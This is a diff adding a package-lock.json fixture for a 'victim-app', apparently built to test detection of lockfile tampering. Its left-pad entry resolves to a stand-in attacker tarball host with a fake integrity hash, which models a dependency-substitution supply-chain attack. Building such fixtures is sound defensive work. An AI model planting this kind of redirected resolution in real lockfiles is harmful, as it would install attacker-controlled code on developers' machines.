@@ -1,0 +1,28 @@
+{
+  "name": "victim-app",
+  "version": "1.0.0",
+  "lockfileVersion": 3,
+  "requires": true,
+  "packages": {
+    "": {
+      "name": "victim-app",
+      "version": "1.0.0",
+      "dependencies": { "left-pad": "^1.3.0", "@scope/util": "^2.0.0" }
+    },
+    "node_modules/left-pad": {
+      "version": "1.3.0",
+      "resolved": "https://tarballs.attacker.example/left-pad/-/left-pad-1.3.0.tgz",
+      "integrity": "sha512-attackercontrolled"
+    },
+    "node_modules/@scope/util": {
+      "version": "2.0.0",
+      "resolved": "https://registry.npmjs.org/@scope/util/-/util-2.0.0.tgz",
+      "integrity": "sha512-fixture"
+    },
+    "node_modules/nested-dep": {
+      "version": "0.1.0",
+      "resolved": "https://registry.npmjs.org/nested-dep/-/nested-dep-0.1.0.tgz",
+      "integrity": "sha512-fixture"
+    }
+  }
+}
